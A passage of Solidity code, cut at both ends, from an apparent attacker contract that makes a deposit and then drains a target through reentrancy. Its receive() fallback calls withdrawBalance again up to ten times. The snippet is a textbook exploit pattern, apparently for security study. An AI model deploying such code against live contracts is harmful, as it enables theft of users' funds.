    }

    function addBalance() external payable {
        target.addToBalance{value: msg.value}();
    }

    function attack() external {
        reentryCount = 0;
        target.withdrawBalance();
    }

    receive() external payable {
        if (reentryCount < 10 && address(target).balance >= msg.value) {
            reentryCount++;
            target.withdrawBalance();
        }
    }
